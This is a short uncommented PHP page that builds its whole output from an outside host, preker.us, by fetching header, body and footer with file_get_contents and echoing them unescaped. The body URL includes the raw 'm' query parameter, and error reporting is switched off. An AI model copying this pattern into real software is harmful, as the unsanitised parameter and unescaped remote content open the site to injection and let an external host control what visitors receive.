<?php
error_reporting(0);
$d = date('ihs');
$get = $_GET["m"];
$a = $_GET["a"];
if($get){
  $m = 'http://preker.us/host/'.$_GET['m'].'.cmx?j='.$d;
}else{
    $m = 'http://preker.us/host/home.php?a=MjAxOS0wMy0xNQ';
}
?>
<!doctype html>
<html>
<head>
<?php
echo file_get_contents('http://preker.us/host/head.php?j='.$d);
$f ='http://preker.us/host/footer.php?j='.$d;
?>
</head>
<body>
<?php
echo file_get_contents($m);
echo file_get_contents($f);
?>
</body>
</html>
